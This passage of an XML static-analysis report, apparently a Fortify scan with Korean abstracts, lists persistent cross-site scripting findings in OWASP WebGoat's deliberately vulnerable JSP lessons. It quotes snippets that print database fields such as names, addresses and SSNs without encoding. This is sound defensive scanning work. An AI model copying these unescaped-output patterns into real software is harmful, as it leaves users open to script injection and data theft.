					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1ADA871399DEDA905719E8B92A5166DF" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="650C3F78824D276E6DE91FF38093A807" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 46 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>46</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0D4BBC1DBFE5721F8CDEB071FB25A959" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 99 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>99</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0E21A09A964AC3314743952A3CEE5DD3" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 33 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>33</LineStart>
<Snippet>						&lt;!-- STAGE 4 - FIX  Note that the description value below gets encoded and address1 here is not --&gt;

						&lt;%=employee.getAddress1()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6DEE8FDE4F98596DD898D48E9BF6775C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D75B00B5F24AA533BD669EDE3B6C779E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getAddress1()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8C2BD2589894D03C73B521DE0A047C75" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=SQLInjection.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BEE6B598332DC12D72F96DA67E572686" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPhoneNumber()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="811291F0D7D790F72E6CD87EB19935D3" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=CrossSiteScripting.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DEF7D2940AB30027C7ED7C51AB623EB3" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getFirstName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E3805247EEAD247C526A4D6E8437238A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 45 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>45</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPhoneNumber()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="15545A0A9DCD6DA3B0A38E2306DCA29A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 105 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>105</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B0B032C56D676AA4AB5711E10D4CB357" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getAddress2()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F46693199C9341D14073339DEAD01AA5" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 28 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>28</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6AD399F5FA5260A79E8F3A4BF6DC1E11" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 9 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>9</LineStart>
<Snippet>//	int myUserId = getIntSessionAttribute(webSession, "SQLInjection." + SQLInjection.USER_ID);
%&gt;
		&lt;div class="lesson_title_box"&gt;&lt;strong&gt;Welcome Back &lt;/strong&gt;&lt;span class="lesson_text_db"&gt;&lt;%=webSession.getUserNameInLesson()%&gt;&lt;/span&gt;&lt;/div&gt;
		&lt;div class="lesson_text"&gt;
				&lt;Table&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>203</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				if (answer_results.next())
					name = answer_results.getString("first_name");</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="68E8E246E434D843E229C53BD1BC89C8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 109 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>109</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5D4D469BC3BFBD5D12ABD4274EE59A87" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AC213A5DD25D6B61105FA6ABAF88D05B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 58 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>58</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8A798BCD95C67D77284358631EE780B9" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2C724B77830F366F8572D3EE0946B413" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
